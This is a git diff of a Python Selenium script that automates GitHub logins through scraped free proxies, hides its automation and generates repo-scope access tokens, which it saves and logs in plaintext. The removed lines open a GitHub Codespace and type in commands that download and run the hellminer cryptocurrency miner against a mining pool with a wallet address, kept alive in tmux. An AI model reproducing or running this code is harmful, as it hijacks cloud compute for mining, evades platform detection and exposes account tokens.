@@ -8,111 +8,87 @@ from selenium.webdriver.common.by import By
 from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.chrome.service import Service
 from selenium.webdriver.chrome.options import Options
-from selenium.webdriver.common.action_chains import ActionChains
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
-from selenium.webdriver.common.proxy import Proxy, ProxyType
 from webdriver_manager.chrome import ChromeDriverManager
-
 
 # Logging setup
 logging.basicConfig(
     level=logging.INFO,
-    format='%(asctime)s - %(levelname)s - %(message)s'
+    format="%(asctime)s - %(levelname)s - %(message)s"
 )
 
-# File token storage
 TOKEN_FILE = "token.txt"
 
-# Scrape proxy
+# Scrape proxy with error handling
 def scrape_proxy():
     url = "https://www.sslproxies.org/"
-    response = requests.get(url)
-    proxies = []
-    if response.status_code == 200:
-        lines = response.text.split("\n")
-        for line in lines:
-            if "<td>" in line:
-                proxies.append(line.split("<td>")[1].split("</td>")[0])
-    return proxies[:5]  # Return first 5 proxies
+    try:
+        response = requests.get(url, timeout=10)
+        proxies = []
+        if response.status_code == 200:
+            from bs4 import BeautifulSoup
+            soup = BeautifulSoup(response.text, "html.parser")
+            rows = soup.find_all("tr")
+            for row in rows:
+                columns = row.find_all("td")
+                if len(columns) > 1:
+                    proxies.append(f"{columns[0].text}:{columns[1].text}")
+        return proxies[:5]
+    except Exception as e:
+        logging.error(f"Failed to scrape proxies: {e}")
+        return []
 
-
-# Configure Selenium WebDriver with Proxy and Explicit Chromium Path
+# Configure Selenium WebDriver
 def configure_driver():
     chrome_options = Options()
-    chrome_options.binary_location = "/usr/bin/chromium-browser"  # Lokasi Chromium di Codespace
     chrome_options.add_argument("--incognito")
     chrome_options.add_argument("--start-maximized")
     chrome_options.add_argument("disable-blink-features=AutomationControlled")
-    chrome_options.add_argument("--disable-dev-shm-usage")  # Untuk menghindari masalah resource di container
-    chrome_options.add_argument("--no-sandbox")  # Diperlukan di lingkungan seperti Codespaces
+    chrome_options.add_argument("--disable-dev-shm-usage")
+    chrome_options.add_argument("--no-sandbox")
     
     proxies = scrape_proxy()
     if proxies:
-        proxy = proxies[0]  # Use the first proxy
+        proxy = proxies[0]
         chrome_options.add_argument(f"--proxy-server={proxy}")
         logging.info(f"Using Proxy: {proxy}")
     return webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=chrome_options)
 
-
-# Login to GitHub
+# GitHub Login with validation
 def github_login(driver, username, password):
     logging.info("Opening GitHub login page...")
     driver.get("https://github.com/login")
-    
     try:
         WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, "login_field"))).send_keys(username)
         driver.find_element(By.ID, "password").send_keys(password)
         driver.find_element(By.NAME, "commit").click()
-        
-        # Check for OTP prompt
-        if "two-factor authentication" in driver.page_source.lower():
-            otp = input("Enter OTP code: ")
-            driver.find_element(By.ID, "otp").send_keys(otp, Keys.RETURN)
-        
+        time.sleep(2)  # Allow time for page to load
+        if "incorrect" in driver.page_source.lower():
+            logging.error("Login failed: Incorrect username or password")
+            return False
         logging.info("Successfully logged in!")
         return True
     except Exception as e:
         logging.error(f"Error during login: {e}")
         return False
 
-
 # Generate and save token
 def generate_token(driver):
     logging.info("Generating GitHub token...")
     driver.get("https://github.com/settings/tokens/new")
-    
-    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, "token_description"))).send_keys("Automated Token")
-    driver.find_element(By.XPATH, "//input[@value='repo']").click()
-    driver.find_element(By.XPATH, "//button[contains(text(), 'Generate token')]").click()
-    
-    token = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, "//code"))).text
-    with open(TOKEN_FILE, "a") as f:
-        f.write(f"{token}\n")
-    logging.info(f"Token saved: {token}")
+    try:
+        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, "token_description"))).send_keys("Automated Token")
+        driver.find_element(By.XPATH, "//input[@value='repo']").click()
+        driver.find_element(By.XPATH, "//button[contains(text(), 'Generate token')]").click()
+        token = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, "//code"))).text
+        with open(TOKEN_FILE, "a") as f:
+            f.write(f"{token}\n")
+        logging.info(f"Token saved: {token}")
+    except Exception as e:
+        logging.error(f"Error generating token: {e}")
 
-
-# Open Codespace link and execute commands
-def open_and_execute_codespace(driver):
-    logging.info("Opening Codespace link...")
-    codespace_url = "https://github.com/codespaces/new?repository=my-repo&container=my-container&skip_quickstart=true&machine=standardLinux32gb&repo=746868415&ref=main&devcontainer_path=.devcontainer%2Fdevcontainer.json&geo=UsEast"
-    driver.get(codespace_url)
-    
-    time.sleep(10)  # Wait for Codespace to load
-
-    # Open terminal and execute commands
-    actions = ActionChains(driver)
-    actions.send_keys("sudo apt update && sudo apt install -y tmux libsodium23 libsodium-dev wget && \\\n")
-    actions.send_keys("tmux new-session -d -s multi_terminal 'while true; do echo \"Menjaga koneksi tetap hidup...\"; sleep 5; clear; done' \\; \\\n")
-    actions.send_keys("split-window -v 'wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64_avx2.tar.gz && tar -xvzf hellminer_linux64_avx2.tar.gz && ./hellminer -v -c stratum+tcp://cn.vipor.net:5040 -u RJMuH1ems9YZKZ1jDnqTtRLuQvuWmBpznQ.Device10 -p x' \\; \\\n")
-    actions.send_keys("split-window -h 'while true; do echo \"Keep-alive ping\" > /dev/null; sleep 10; done' \\; \\\n")
-    actions.send_keys("select-layout tiled \\; \\\n")
-    actions.send_keys("attach\n")
-    actions.perform()
-    logging.info("Commands executed in Codespace!")
-
-
-# Monitor and restart Codespace
+# Monitor Codespace with retry mechanism
 def monitor_codespace(driver):
     while True:
         try:
@@ -126,22 +102,17 @@ def monitor_codespace(driver):
             time.sleep(30)
         except Exception as e:
             logging.error(f"Error monitoring Codespace: {e}")
+            time.sleep(5)
 
-
-# Main Function
 def main():
     driver = configure_driver()
-    while True:
-        username = input("Masukkan username: ")
-        password = input("Masukkan password: ")
-        
-        if github_login(driver, username, password):
-            generate_token(driver)
-            open_and_execute_codespace(driver)
-            monitor_codespace(driver)
-        else:
-            logging.error("Login failed. Try again!")
-
+    username = input("Enter GitHub username: ")
+    password = input("Enter GitHub password: ")
+    if github_login(driver, username, password):
+        generate_token(driver)
+        monitor_codespace(driver)
+    else:
+        logging.error("Login failed. Exiting program.")
 
 if __name__ == "__main__":
     main()
